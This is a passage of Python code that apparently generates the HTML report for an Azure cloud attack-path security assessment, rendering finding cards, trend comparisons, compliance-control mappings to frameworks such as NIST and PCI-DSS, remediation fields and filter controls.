      <div class="stat-label">If All Addressable Fixed ({len(all_addressable)} paths)</div>
      <div style="font-size:11px;color:#107C10;margin-top:4px">▼ {delta_all} pts</div>
    </div>
  </div>
</section>"""


def _trend_section(trend: dict | None) -> str:
    """Trend comparison vs previous run."""
    if not trend:
        return ""
    direction = trend.get("Direction", "stable")
    if direction == "improved":
        icon, color = "📉", "#107C10"
    elif direction == "worsened":
        icon, color = "📈", "#D13438"
    else:
        icon, color = "➡️", "#FFB900"

    return f"""
<section class="section" id="trend">
  <h2>{icon} Trend vs Previous Run</h2>
  {_section_explainer('How to Read This Section',
    '<p>This section compares the current assessment against the <strong>previous run</strong> to show improvement '
    'or degradation over time. <strong>New Paths</strong> represent newly discovered attack vectors. '
    '<strong>Resolved Paths</strong> are previously detected paths that no longer exist (remediated or configuration changed).</p>'
    '<p>A decreasing trend indicates security posture improvement. Increasing trends may indicate configuration drift, '
    'new resource deployments, or emerging attack vectors.</p>'
  )}
  <div class="stat-grid" style="grid-template-columns:repeat(4,1fr)">
    <div class="stat-card"><div class="stat-value">{trend.get('PreviousTotal', 0)}</div><div class="stat-label">Previous</div></div>
    <div class="stat-card"><div class="stat-value">{trend.get('CurrentTotal', 0)}</div><div class="stat-label">Current</div></div>
    <div class="stat-card"><div class="stat-value" style="color:#D13438">+{trend.get('NewPaths', 0)}</div><div class="stat-label">New Paths</div></div>
    <div class="stat-card"><div class="stat-value" style="color:#107C10">-{trend.get('ResolvedPaths', 0)}</div><div class="stat-label">Resolved</div></div>
  </div>
</section>"""


def _compliance_tags(path: dict, compliance_map: dict, index: int = 0) -> str:
    """Render compliance framework tags as clickable popup triggers.

    Popup now renders for each control:
      • Framework name + control ID
      • Official control title
      • Plain-English description of what the control requires
      • How this control relates to THIS specific finding (path type + MITRE technique)
      • Direct link to the official framework documentation
    """
    # Use path-level frameworks first, then fall back to MITRE mapping
    frameworks = path.get("ComplianceFrameworks")
    if not frameworks:
        technique = path.get("MitreTechnique", "")
        frameworks = compliance_map.get(technique, {})

    if not frameworks:
        return ""

    framework_meta = {
        "NIST-800-53":  {"display": "NIST 800-53",   "doc_url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final", "issuer": "NIST",                 "icon": "🇺🇸"},
        "NIST":         {"display": "NIST 800-53",   "doc_url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final", "issuer": "NIST",                 "icon": "🇺🇸"},
        "CIS":          {"display": "CIS Benchmark", "doc_url": "https://www.cisecurity.org/cis-benchmarks",                       "issuer": "Center for Internet Security", "icon": "🛡️"},
        "CIS-Azure":    {"display": "CIS Azure",     "doc_url": "https://www.cisecurity.org/benchmark/azure",                      "issuer": "Center for Internet Security", "icon": "🛡️"},
        "HIPAA":        {"display": "HIPAA",         "doc_url": "https://www.hhs.gov/hipaa/for-professionals/security/index.html", "issuer": "U.S. Dept. of Health & Human Services", "icon": "🏥"},
        "PCI-DSS":      {"display": "PCI-DSS",       "doc_url": "https://www.pcisecuritystandards.org/document_library/",          "issuer": "PCI Security Standards Council",        "icon": "💳"},
        "ISO-27001":    {"display": "ISO 27001",     "doc_url": "https://www.iso.org/isoiec-27001-information-security.html",      "issuer": "International Organization for Standardization", "icon": "🌐"},
        "SOC-2":        {"display": "SOC 2",         "doc_url": "https://www.aicpa-cima.com/topic/audit-assurance/audit-and-assurance-greater-than-soc-2", "issuer": "AICPA", "icon": "📊"},
    }

    # Pull catalog + path-type-specific relevance helper
    catalog = _control_catalog()
    ptype = path.get("Type", "unknown")
    mitre = path.get("MitreTechnique", "")
    relevance_intro = _relevance_for_path(ptype, mitre)

    popup_id = f"fw-popup-{index}"
    tags = []
    popup_body_parts = []

    # Top-of-popup: which finding the controls relate to
    finding_summary = (path.get("Chain") or path.get("Description") or "")[:240]
    popup_body_parts.append(
        f'<div class="fw-finding-hdr">'
        f'<div class="fw-finding-h">📌 Finding</div>'
        f'<div class="fw-finding-sum">{_esc(finding_summary)}</div>'
        + (f'<div class="fw-finding-meta"><span class="fw-finding-pill">Type: {_esc(ptype)}</span>'
           + (f'<span class="fw-finding-pill">MITRE: <code>{_esc(mitre)}</code></span>' if mitre else "")
           + '</div>' if (ptype or mitre) else "")
        + '</div>'
    )
    popup_body_parts.append(
        '<div class="fw-rel-intro">'
        '<strong>Why these controls apply:</strong> ' + relevance_intro
        + '</div>'
    )

    for fw, controls in sorted(frameworks.items()):
        meta = framework_meta.get(fw, {"display": fw, "doc_url": "", "issuer": "", "icon": "📋"})
        display = meta["display"]
        ctrl_list = controls if isinstance(controls, list) else [str(controls)]
        tags.append(
            f'<span class="fw-link" onclick="openCompliancePopup(\'{popup_id}\')">'
            f'\U0001f6e1\ufe0f {_esc(display)} <small>({len(ctrl_list)})</small></span>'
        )

        ctrl_html_parts = []
        for ctrl in ctrl_list:
            ctrl_id = str(ctrl).strip()
            info = catalog.get(fw, {}).get(ctrl_id) or catalog.get(fw, {}).get(ctrl_id.upper()) or {}
            title = info.get("title", "") or "—"
            desc  = info.get("desc", "")  or "—"
            rel   = info.get("relevance", {}).get(ptype) or _generic_relevance(fw, ctrl_id, ptype, mitre)
            ctrl_html_parts.append(
                f'<tr>'
                f'<td class="fw-td-id"><span class="fw-ctrl-id">{_esc(ctrl_id)}</span></td>'
                f'<td class="fw-td-title">{_esc(title)}</td>'
                f'<td class="fw-td-desc">{_esc(desc)}</td>'
                f'<td class="fw-td-rel">{_esc(rel)}</td>'
                f'</tr>'
            )
        popup_body_parts.append(
            f'<div class="fw-section">'
            f'<div class="fw-section-hdr">'
            f'<span>{meta["icon"]} {_esc(display)}</span>'
            + (f'<a class="fw-section-link" href="{_esc(meta["doc_url"])}" target="_blank" rel="noopener">Official ↗</a>' if meta["doc_url"] else "")
            + '</div>'
            + (f'<div class="fw-section-issuer">Issuer: {_esc(meta["issuer"])} &middot; {len(ctrl_list)} control(s) mapped</div>' if meta["issuer"] else "")
            + '<div class="fw-table-wrap">'
            + '<table class="fw-table">'
            + '<thead><tr>'
            + '<th style="width:14%">Control ID</th>'
            + '<th style="width:24%">Title</th>'
            + '<th style="width:32%">What It Requires</th>'
            + '<th style="width:30%">Relevance to This Finding</th>'
            + '</tr></thead>'
            + '<tbody>' + "".join(ctrl_html_parts) + '</tbody>'
            + '</table>'
            + '</div>'
            + '</div>'
        )

    popup_html = (
        f'<div class="fw-popup" id="{popup_id}">'
        f'<div class="fw-popup-hdr">'
        f'<span>\U0001f6e1\ufe0f Compliance Frameworks &mdash; mapped to this finding</span>'
        f'<button class="fw-popup-close" onclick="closeCompliancePopup(\'{popup_id}\')">&#10005;</button>'
        f'</div>'
        f'<div class="fw-popup-body">{"".join(popup_body_parts)}</div>'
        f'</div>'
    )

    return f'<div class="compliance-fw-wrap">{"".join(tags)}{popup_html}</div>'


# ── Compliance Control Catalog ───────────────────────────────────────────
# Provides title + description for each control ID we map to.
# Keys are exactly the control IDs (case-sensitive) emitted in ComplianceFrameworks.
def _control_catalog() -> dict:
    cat = {
        "NIST-800-53": {
            "AC-2":    {"title": "Account Management", "desc": "Establish, monitor, and disable accounts (including service / application accounts) on a defined lifecycle. Restrict shared, dormant, and emergency accounts."},
            "AC-3":    {"title": "Access Enforcement", "desc": "Enforce approved authorizations for logical access to systems and resources. Privileges must be explicit and revocable."},
            "AC-6":    {"title": "Least Privilege",    "desc": "Grant only the access necessary to accomplish assigned tasks. Privileged functions must be explicitly authorized and audited."},
            "AC-6(1)": {"title": "Authorize Access to Security Functions", "desc": "Limit the assignment of privileged roles to a minimum number of authorized individuals."},
            "AC-6(7)": {"title": "Review of User Privileges", "desc": "Review privileged role assignments at least quarterly and revoke unneeded privileges."},
            "IA-2":    {"title": "Identification and Authentication", "desc": "Uniquely identify and authenticate every user and process accessing the system."},
            "IA-5":    {"title": "Authenticator Management", "desc": "Establish initial authenticator content, change authenticators on a defined cadence, and protect authenticator content from unauthorized disclosure."},
            "IA-5(1)": {"title": "Password-Based Authentication", "desc": "Enforce password complexity, prohibit password reuse, and protect password storage with cryptographic mechanisms."},
            "IA-5(7)": {"title": "No Embedded Unencrypted Static Authenticators", "desc": "Prohibit embedded unencrypted static authenticators (passwords, keys, certificates) in applications, scripts, or configuration files."},
            "AU-2":    {"title": "Audit Events", "desc": "Determine the events the system is capable of logging and audit them in support of after-the-fact investigations."},
            "AU-12":   {"title": "Audit Generation", "desc": "Generate audit records for the events specified in AU-2 with the content specified in AU-3."},
            "SC-7":    {"title": "Boundary Protection", "desc": "Monitor and control communications at the external boundary of the system and at key internal boundaries."},
            "SC-8":    {"title": "Transmission Confidentiality and Integrity", "desc": "Protect the confidentiality and integrity of transmitted information."},
            "SC-12":   {"title": "Cryptographic Key Establishment and Management", "desc": "Establish and manage cryptographic keys when cryptography is employed within the system."},
            "SC-13":   {"title": "Cryptographic Protection", "desc": "Implement FIPS-validated or NSA-approved cryptography to protect information requiring confidentiality."},
            "SC-28":   {"title": "Protection of Information at Rest", "desc": "Protect the confidentiality and integrity of information at rest using cryptographic mechanisms."},
            "SI-4":    {"title": "Information System Monitoring", "desc": "Monitor the system to detect attacks and indicators of potential attacks; collect monitoring information at strategic locations."},
            "CM-6":    {"title": "Configuration Settings", "desc": "Establish and document configuration settings for components employing the most restrictive mode consistent with operational requirements."},
            "CM-7":    {"title": "Least Functionality", "desc": "Configure the system to provide only essential capabilities; prohibit or restrict use of unnecessary functions, ports, protocols, and services."},
        },
        # NIST (alias) populated below after dict construction
        "CIS": {
            "1.1":  {"title": "Maintain Inventory of Administrative Accounts", "desc": "Use Microsoft Entra ID to maintain an inventory of all administrative accounts, including emergency-access (break-glass) accounts."},
            "1.3":  {"title": "Ensure Guest Users Are Reviewed", "desc": "Guest users must be reviewed on a regular basis (at least quarterly) and removed when access is no longer required."},
            "1.5":  {"title": "Multi-Factor Authentication for All Users", "desc": "MFA must be enforced for all users in the tenant, with phishing-resistant methods preferred for privileged roles."},
            "1.21": {"title": "Restrict User Consent to Verified Apps", "desc": "Restrict non-admin users from consenting to applications unless the publisher is verified and the requested permissions are low-risk."},
            "1.22": {"title": "Admin Consent Workflow", "desc": "Enable the admin-consent workflow so that requests for high-privilege permissions go through a documented review."},
            "3.1":  {"title": "Disable Storage Account Public Access", "desc": "Public anonymous access at the storage-account level must be disabled to prevent accidental exposure of blob containers."},
            "3.4":  {"title": "Storage Account Default Network Access = Deny", "desc": "The storage account's default network rule must be set to Deny; specific networks are then explicitly allowed."},
            "3.7":  {"title": "Storage Soft-Delete Retention", "desc": "Soft-delete must be enabled with a retention period of at least 7 days to allow recovery from accidental or malicious deletion."},
            "3.9":  {"title": "Disable Public Network Access on Cognitive / AI Services", "desc": "Cognitive (AI) Services must reject requests from public networks; access should be through Private Endpoints + RBAC."},
            "5.1":  {"title": "Diagnostic Logs on Subscriptions", "desc": "Activity-log diagnostic settings must be configured on every subscription and exported to a Log Analytics workspace."},
            "5.4":  {"title": "Defender for Cloud at Standard Tier", "desc": "Microsoft Defender for Cloud must be enabled at the Standard (now 'Defender') tier on all relevant resource types."},
            "8.2.1":{"title": "Restrict Access to Cardholder Data Network Segments", "desc": "Network segments holding cardholder data must reject all traffic except explicitly authorized flows."},
        },
        "CIS-Azure": {},  # alias
        "HIPAA": {
            "164.308(a)(3)":  {"title": "Workforce Security",                "desc": "Implement procedures to authorize, supervise, and terminate workforce members who work with electronic Protected Health Information (ePHI)."},
            "164.308(a)(4)":  {"title": "Information Access Management",     "desc": "Implement role-based access policies and procedures granting workforce only the ePHI access necessary for their role."},
            "164.308(a)(5)":  {"title": "Security Awareness and Training",   "desc": "Implement an ongoing security-awareness and training program for the workforce."},
            "164.312(a)(1)":  {"title": "Access Control",                    "desc": "Implement technical policies and procedures that allow only authorized persons or software programs access to ePHI."},
            "164.312(a)(2)(iv)":{"title": "Encryption and Decryption",       "desc": "Implement a mechanism to encrypt and decrypt ePHI at rest."},
            "164.312(b)":     {"title": "Audit Controls",                    "desc": "Implement hardware, software, and procedural mechanisms that record and examine activity in systems containing ePHI."},
            "164.312(c)(1)":  {"title": "Integrity",                         "desc": "Implement policies and procedures to protect ePHI from improper alteration or destruction."},
            "164.312(d)":     {"title": "Person or Entity Authentication",   "desc": "Verify that a person or entity seeking access to ePHI is the one claimed."},
            "164.312(e)(1)":  {"title": "Transmission Security",             "desc": "Guard against unauthorized access to ePHI being transmitted over an electronic communications network."},
            "164.312(e)(2)(ii)":{"title": "Encryption (Transmission)",       "desc": "Implement a mechanism to encrypt ePHI whenever deemed appropriate during transmission."},
        },
        "PCI-DSS": {
            "1.2":  {"title": "Restrict Inbound and Outbound Network Traffic", "desc": "Restrict connections between untrusted networks and any system in the cardholder-data environment to only those necessary."},
            "1.3":  {"title": "Prohibit Direct Public Access to CDE",          "desc": "Prohibit direct public access between the Internet and any system component in the cardholder-data environment."},
            "2.2":  {"title": "Hardened Configuration Standards",              "desc": "Apply secure configuration standards (e.g., CIS Benchmarks) to all system components and remove unnecessary services."},
            "2.3":  {"title": "Encrypt Non-Console Administrative Access",     "desc": "Encrypt all non-console administrative access using strong cryptography (TLS/SSH)."},
            "3.4":  {"title": "Render PAN Unreadable Anywhere It Is Stored",   "desc": "Render the Primary Account Number unreadable wherever it is stored (one-way hashes, truncation, or strong encryption)."},
            "3.5":  {"title": "Document and Implement Procedures to Protect Cryptographic Keys", "desc": "Restrict access to cryptographic keys to the fewest custodians necessary; store keys securely."},
            "7.1":  {"title": "Limit Access to System Components and Cardholder Data by Need to Know", "desc": "Define access needs by job role and grant the minimum required to perform the role's function."},
            "7.2":  {"title": "Establish an Access Control System",            "desc": "Establish an access control system that restricts access based on a user's need to know and is set to 'deny all' unless specifically allowed."},
            "8.2":  {"title": "Strong Authentication",                         "desc": "Employ strong authentication for all access to system components — including MFA for non-console admin and remote access."},
            "8.2.1":{"title": "Password Strength Requirements",                 "desc": "Use strong cryptography to render all authentication credentials unreadable during transmission and storage."},
            "10.1": {"title": "Audit Trails",                                  "desc": "Implement audit trails to link all access to system components to each individual user."},
            "10.2": {"title": "Audit Trail Events",                            "desc": "Implement automated audit trails for all system components to reconstruct security events."},
        },
        "ISO-27001": {
            "A.5.15":  {"title": "Access Control",                  "desc": "Establish, document, and review rules to control access to information and other associated assets, based on business and security requirements."},
            "A.5.16":  {"title": "Identity Management",             "desc": "Manage the full lifecycle of identities (creation, modification, removal) used to access organizational assets."},
            "A.5.17":  {"title": "Authentication Information",      "desc": "Manage the allocation and use of authentication information through a formal management process."},
            "A.5.18":  {"title": "Access Rights",                   "desc": "Provision, review, modify, and remove access rights to information and assets in accordance with the access control policy."},
            "A.8.2":   {"title": "Privileged Access Rights",        "desc": "Restrict and manage the allocation and use of privileged access rights using a formal authorization process."},
            "A.8.3":   {"title": "Information Access Restriction",  "desc": "Restrict access to information and other associated assets in accordance with the established access control policy."},
            "A.8.5":   {"title": "Secure Authentication",           "desc": "Implement secure authentication technologies and procedures based on information access restrictions and the access control policy."},
            "A.8.9":   {"title": "Configuration Management",        "desc": "Establish, document, implement, monitor, and review configurations of hardware, software, services, and networks."},
            "A.8.20":  {"title": "Network Security",                "desc": "Manage and control networks and network devices to protect information in systems and applications."},
            "A.8.21":  {"title": "Security of Network Services",    "desc": "Identify and apply security mechanisms, service levels, and management requirements for all network services."},
            "A.8.23":  {"title": "Web Filtering",                   "desc": "Manage access to external websites to reduce exposure to malicious content."},
            "A.8.24":  {"title": "Use of Cryptography",             "desc": "Define and implement rules for the effective use of cryptography, including cryptographic key management."},
            # Legacy ISO/IEC 27001:2013 references some of our older mappings still emit
            "A.9.1.1": {"title": "Access Control Policy",           "desc": "An access control policy must be established, documented, and reviewed based on business and information security requirements."},
            "A.9.2.3": {"title": "Management of Privileged Access Rights", "desc": "The allocation and use of privileged access rights must be restricted and controlled."},
            "A.9.4.1": {"title": "Information Access Restriction",  "desc": "Access to information and application system functions must be restricted in accordance with the access control policy."},
            "A.9.4.3": {"title": "Password Management System",      "desc": "Password management systems must be interactive and ensure quality passwords."},
            "A.10.1.1":{"title": "Policy on the Use of Cryptographic Controls", "desc": "A policy on the use of cryptographic controls for protection of information must be developed and implemented."},
            "A.13.1.1":{"title": "Network Controls",                "desc": "Networks must be managed and controlled to protect information in systems and applications."},
            "A.13.1.3":{"title": "Segregation in Networks",         "desc": "Groups of information services, users, and information systems must be segregated on networks."},
        },
        "SOC-2": {
            "CC6.1": {"title": "Logical Access Security",     "desc": "The entity implements logical access security software, infrastructure, and architectures over protected information assets."},
            "CC6.2": {"title": "User Access Provisioning",    "desc": "Prior to issuing system credentials, the entity registers and authorizes new internal and external users; access is removed when no longer required."},
            "CC6.3": {"title": "Role-Based Access",           "desc": "The entity authorizes, modifies, or removes access to data based on roles, responsibilities, or the system design and changes."},
            "CC6.6": {"title": "Logical Access — External Connections", "desc": "The entity implements logical access security measures to protect against threats from sources outside its system boundaries."},
            "CC6.7": {"title": "Restricted Transmission of Data", "desc": "The entity restricts the transmission, movement, and removal of information to authorized internal and external users."},
            "CC6.8": {"title": "Prevention of Malicious Software", "desc": "The entity implements controls to prevent or detect and act upon the introduction of unauthorized or malicious software."},
            "CC7.1": {"title": "Detection of Configuration Changes", "desc": "The entity uses detection and monitoring procedures to identify changes to configurations that result in introduction of new vulnerabilities."},
            "CC7.2": {"title": "Monitoring of System Components",   "desc": "The entity monitors system components and the operation of those components for anomalies indicative of malicious acts or natural disasters."},
        },
    }
    # Aliases — same control IDs, different framework keys callers may emit
    cat["NIST"] = cat["NIST-800-53"]
    cat["CIS-Azure"] = cat["CIS"]
    return cat


def _relevance_for_path(ptype: str, mitre: str) -> str:
    """One-paragraph explanation of why compliance controls apply to this attack-path type."""
    by_type = {
        "consent_abuse":        "Tenant-wide OAuth consent grants give applications broad delegated access to user data. Frameworks treat this as an authorization-and-authentication failure: controls require approved authorizations (NIST AC-3, ISO A.5.15), least privilege (NIST AC-6), and lifecycle management of identities and consents (ISO A.5.16, CIS 1.21).",
        "privilege_escalation": "Privileged-role escalation undermines the principle of least privilege. Controls below mandate explicit authorization, periodic review, and protection of high-impact roles (NIST AC-6/AC-6(7), ISO A.8.2, SOC-2 CC6.3).",
        "lateral_movement":     "Lateral movement converts one compromise into many. Controls require boundary protection, network segmentation, and detection of anomalous east-west traffic (NIST SC-7, ISO A.8.20/A.8.21, SOC-2 CC7.2).",
        "credential_chain":     "Stored secrets feeding downstream services are the multiplier in cloud breaches. Frameworks require strong authenticator management, prohibition of embedded credentials, and key-management controls (NIST IA-5/IA-5(7), SC-12, ISO A.8.24).",
        "exposed_high_value":   "Publicly reachable data stores violate boundary-protection and confidentiality requirements. Controls demand network restrictions, least-functionality posture, and protection of data at rest (NIST SC-7/SC-28, CIS 3.x, ISO A.8.20).",
        "ca_bypass":            "Conditional Access bypasses negate the tenant's authentication policy. Controls require MFA, secure authentication mechanisms, and continuous monitoring of authentication events (NIST IA-2, ISO A.5.17/A.8.5, CIS 1.5).",
        "pim_escalation":       "Misconfigured PIM gives standing privilege without friction. Controls require authorization, approval workflows, and audit of privileged-role activations (NIST AC-6/AU-2, ISO A.8.2).",
        "data_exposure":        "Data exposure incidents trigger the highest regulatory exposure. Controls require encryption at rest, transmission protection, and audit trails (NIST SC-28/SC-8/AU-12, HIPAA 164.312(a)(2)(iv), PCI 3.4).",
        "network_pivot":        "Network pivots violate the assumption of segmented trust zones. Controls require boundary protection, network segregation, and monitoring (NIST SC-7, ISO A.8.20/A.13.1.3).",
    }
    txt = by_type.get(ptype, "")
    if not txt:
        if mitre:
            txt = f"This finding is mapped to MITRE ATT&CK technique {mitre}; the controls below are the regulatory and industry requirements that an audit would expect to see implemented to prevent or detect this technique."
        else:
            txt = "The controls below are the regulatory and industry requirements that an audit would expect to see implemented to prevent or detect this finding."
    return txt


def _generic_relevance(fw: str, ctrl_id: str, ptype: str, mitre: str) -> str:
    """Fallback per-control relevance text when no specific mapping is provided in the catalog."""
    fw_label = fw.replace("-", " ")
    if mitre:
        return f"This control is the {fw_label} requirement that auditors expect to see in place to prevent or detect MITRE ATT&CK technique {mitre} (path type: {ptype}). An open finding here would be cited during a {fw_label} assessment."
    return f"This control is the {fw_label} requirement that auditors expect to see in place to prevent or detect path type '{ptype}'. An open finding here would be cited during a {fw_label} assessment."


def _azure_portal_link(resource_id: str) -> str:
    """Generate Azure Portal deep link for a resource."""
    if not resource_id or not resource_id.startswith("/"):
        return ""
    encoded = resource_id.replace("/", "%2F")
    url = f"https://portal.azure.com/#@/resource{resource_id}"
    return f'<a href="{_esc(url)}" target="_blank" rel="noopener" class="portal-link">View in Azure Portal ↗</a>'


def _path_card(path: dict, index: int, compliance_map: dict) -> str:
    """Full-featured finding card with chain diagram, compliance, remediation."""
    sev = path.get("Severity", "informational").lower()
    ptype = path.get("Type", "unknown")
    chain_text = path.get("Chain", "")
    score = path.get("RiskScore", 0)
    mitre = path.get("MitreTechnique", "")
    mitre_tactic = path.get("MitreTactic", "")
    remediation = path.get("Remediation", "")
    remediation_cli = path.get("RemediationCLI", "")
    remediation_ps = path.get("RemediationPowerShell", "")
    remediation_portal = path.get("RemediationPortal", "")
    ms_url = path.get("MSLearnUrl", "")
    resource_id = path.get("ResourceId", "")
    resource_name = path.get("ResourceName", "")
    resource_type = path.get("ResourceType", "")
    color = _SEVERITY_COLORS.get(sev, "#6B6B6B")
    icon = _TYPE_ICONS.get(ptype, "📌")

    # Chain diagram
    chain_html = f'<div class="chain-container" style="overflow-x:auto;padding:8px 0">{_chain_diagram_svg(path)}</div>'

    # Sequence diagram (only for paths with 3+ chain nodes)
    seq_html = ""
    chain_nodes = path.get("ChainNodes", [])
    if len(chain_nodes) >= 3:
        seq_html = f'<details class="seq-details"><summary>\U0001f50d Attack Execution Walkthrough &mdash; Step-by-Step Technical Analysis</summary>{_sequence_diagram_html(path, index)}</details>'

    # MITRE tag
    mitre_html = ""
    if mitre:
        mitre_url = f"https://attack.mitre.org/techniques/{mitre.replace('.', '/')}/"
        mitre_html = (
            f'<a href="{mitre_url}" target="_blank" rel="noopener" class="mitre-badge">'
            f'{_esc(mitre)}</a>'
            f'<span class="tactic-label">{_esc(mitre_tactic)}</span>'
        )

    # Compliance frameworks
    compliance_html = _compliance_tags(path, compliance_map, index)

    # Detail rows
    detail_rows = ""
    detail_fields = [
        ("Principal", path.get("PrincipalName", "")),
        ("Principal ID", path.get("PrincipalId", "")),
        ("Principal Type", path.get("PrincipalType", "")),
        ("Source", path.get("Source", "")),
        ("Target", path.get("Target", "")),
        ("Resource", resource_name),
        ("Resource Type", resource_type),
        ("Exposure", path.get("Exposure", "")),
        ("Roles", ", ".join(path.get("Roles", []))),
        ("Credential Status", path.get("CredentialStatus", "")),
        ("Role Name", path.get("RoleName", "")),
        ("Subtype", path.get("Subtype", "")),
    ]
    for label, val in detail_fields:
        if val:
            detail_rows += f'<tr><td class="detail-key">{_esc(label)}</td><td>{_esc(str(val))}</td></tr>'

    # Azure Portal link
    portal_link = _azure_portal_link(resource_id) if resource_id else ""

    # Remediation section
    remediation_html = ""
    if remediation or remediation_cli or remediation_ps or remediation_portal:
        rem_parts = []
        if remediation:
            rem_parts.append(f'<div class="rem-text">{_esc(remediation)}</div>')
        if remediation_cli:
            rem_parts.append(f'<div class="rem-cmd"><strong>Azure CLI:</strong><pre><code>{_esc(remediation_cli)}</code></pre></div>')
        if remediation_ps:
            rem_parts.append(f'<div class="rem-cmd"><strong>PowerShell:</strong><pre><code>{_esc(remediation_ps)}</code></pre></div>')
        if remediation_portal:
            rem_parts.append(f'<div class="rem-cmd"><strong>Portal:</strong> {_esc(remediation_portal)}</div>')
        if ms_url:
            rem_parts.append(f'<div class="rem-link"><a href="{_esc(ms_url)}" target="_blank" rel="noopener">📘 Microsoft Learn Documentation ↗</a></div>')
        remediation_html = f'<div class="remediation">{"".join(rem_parts)}</div>'

    return f"""
<div class="finding-card {sev}" id="path-{index}" role="article"
     aria-label="Attack path {index + 1}: {_esc(ptype)} - {sev} severity"
     data-severity="{sev}" data-type="{_esc(ptype)}"
     data-mitre="{_esc(mitre)}" data-score="{score}">
  <div class="finding-header">
    <span class="badge" style="background:{color}" data-tip="{_esc(sev.capitalize())} severity — Risk Score {score}/100">{_esc(sev.upper())}</span>
    <span class="path-icon">{icon}</span>
    <span class="path-type-label">{_esc(_TYPE_LABELS.get(ptype, ptype))}</span>
    <span class="path-score-badge" data-tip="Composite risk score based on exploitability, blast radius, and data sensitivity.">Score: <strong>{score}</strong></span>
    {mitre_html}
  </div>
  {chain_html}
  <div class="chain-text-description">{_esc(chain_text)}</div>
  {seq_html}
  {_exploitation_analysis(path)}
  {compliance_html}
  {portal_link}
  <details class="path-details">
    <summary>View Details ({len([v for _, v in detail_fields if v])} fields)</summary>
    <table class="detail-table">{detail_rows}</table>
  </details>
  {remediation_html}
</div>"""


def _filter_bar_html() -> str:
    """Search, filter, and sort controls."""
    return """
<div class="filter-bar no-print" id="filter-bar">
  <div class="filter-group">
    <label for="search-input" data-tip="Type to search attack path descriptions, chain text, and titles.">Search</label>
    <input type="text" id="search-input" placeholder="Search attack paths…"
           class="filter-input" aria-label="Search attack paths" aria-describedby="result-count">
  </div>
  <div class="filter-group">
    <label for="severity-filter" data-tip="Filter attack paths by their assigned severity level.">Severity</label>
    <select id="severity-filter" class="filter-select" aria-label="Filter by severity">
      <option value="">All Severities</option>
      <option value="critical">Critical</option>
      <option value="high">High</option>
      <option value="medium">Medium</option>
      <option value="low">Low</option>
      <option value="informational">Informational</option>
    </select>
  </div>
  <div class="filter-group">
    <label for="type-filter" data-tip="Filter by attack path category (e.g. privilege escalation, lateral movement).">Type</label>
    <select id="type-filter" class="filter-select" aria-label="Filter by attack type">
      <option value="">All Types</option>
    </select>
  </div>
  <div class="filter-group">
    <label for="sort-select" data-tip="Change the sort order of attack path findings below.">Sort</label>
    <select id="sort-select" class="filter-select" aria-label="Sort paths">
      <option value="score-desc">Score (High → Low)</option>
      <option value="score-asc">Score (Low → High)</option>
      <option value="severity">Severity</option>
      <option value="type">Type</option>
    </select>
  </div>
  <span id="result-count" class="result-count" aria-live="polite"></span>
</div>"""


def _all_findings_section(paths: list[dict], compliance_map: dict) -> str:
    """All finding cards grouped by type with filtering."""
    sorted_paths = sorted(paths, key=lambda p: (-p.get("RiskScore", 0), _SEVERITY_ORDER.get(p.get("Severity", "informational").lower(), 4)))

    by_type: dict[str, list[dict]] = {}
    for p in sorted_paths:
        by_type.setdefault(p.get("Type", "unknown"), []).append(p)

    sections = []
    card_idx = 0
    type_order = [
        "privilege_escalation", "compromised_identity", "pim_escalation",
        "ca_bypass", "network_pivot", "lateral_movement",
        "credential_chain", "custom_role_escalation",
        "exposed_high_value", "consent_abuse",
        "data_exposure", "ai_attack_surface", "cross_tenant",
    ]

    for ptype in type_order:
        group = by_type.get(ptype, [])
        if not group:
            continue
        label = _TYPE_LABELS.get(ptype, ptype)
        icon = _TYPE_ICONS.get(ptype, "📌")
        max_sev = min(group, key=lambda p: _SEVERITY_ORDER.get(p.get("Severity", "informational").lower(), 4))
        sev_color = _SEVERITY_COLORS.get(max_sev.get("Severity", "informational").lower(), "#6B6B6B")

        cards = []
        for p in group:
            cards.append(_path_card(p, card_idx, compliance_map))
            card_idx += 1

        sections.append(f"""
<section class="section type-section" id="type-{_esc(ptype)}">
  <h2 style="border-left:4px solid {sev_color};padding-left:12px">
    {icon} {_esc(label)} <span class="type-count">({len(group)})</span>
  </h2>
  <div class="type-cards">{"".join(cards)}</div>
</section>""")

    return f"""
<section class="section" id="all-findings">
  <h2>All Attack Paths</h2>
  {_section_explainer('How to Read This Section',
    '<p>Each finding card represents a <strong>single attack path</strong> &mdash; a sequence of steps an adversary '
    'could follow to move from an entry point to a high-value target. The <strong>chain diagram</strong> visualizes '
    'each step, and the <strong>severity badge</strong> indicates risk level.</p>'
    '<p>Click <strong>View Details</strong> to see affected resources, principals, and roles. '
    'The <strong>Security Assessment Analysis</strong> section provides exploitation walkthrough, prerequisites, '
    'business impact, and detection indicators. The <strong>Remediation</strong> section provides actionable CLI '
    'commands and portal steps. Use the filters above to narrow results by severity, category, or search term.</p>'
  )}
  {_filter_bar_html()}
  <div id="findings-container">{"".join(sections)}</div>
  <div class="pagination no-print" id="pagination">
    <button id="show-more-btn" class="show-more-btn" style="display:none" aria-label="Show more results">
      Show More Results
    </button>
  </div>
</section>"""


def _evidence_section(ev_types: dict, errors: list) -> str:
    """Evidence collection summary."""
    rows = "".join(
        f'<tr><td><code>{_esc(k)}</code></td><td style="text-align:center">{v}</td></tr>'
        for k, v in sorted(ev_types.items()) if v > 0
    )
    zero_rows = "".join(
        f'<tr style="opacity:0.5"><td><code>{_esc(k)}</code></td><td style="text-align:center">0</td></tr>'
        for k, v in sorted(ev_types.items()) if v == 0
    )

    error_html = ""
    if errors:
        error_items = "".join(
            f'<li><code>{_esc(e.get("query", ""))}</code> — {_esc(e.get("error", ""))}</li>'
            for e in errors
        )
        error_html = f"""
<h3 style="margin-top:24px">Collection Warnings</h3>
<ul class="error-list">{error_items}</ul>"""

    return f"""
<section class="section" id="evidence">
  <h2>Evidence Collection</h2>
  {_section_explainer('How to Read This Section',
    '<p>This table summarizes the <strong>raw data collected</strong> during the assessment. Higher record counts '
    'indicate deeper analysis coverage for that evidence category.</p>'
    '<p>Evidence types with <strong>zero records</strong> may indicate API permission limitations (e.g., PIM, Risky Users '
    'require specific Entra ID Premium licenses), services not deployed, or configurations not applicable to your tenant. '
    'Collection warnings below identify any API errors encountered during evidence gathering.</p>'
  )}
  <table class="data-table">
    <thead><tr><th>Evidence Type</th><th style="text-align:center">Records</th></tr></thead>
    <tbody>{rows}{zero_rows}</tbody>
  </table>
  {error_html}
</section>"""


def _methodology_section() -> str:
    """Assessment methodology."""
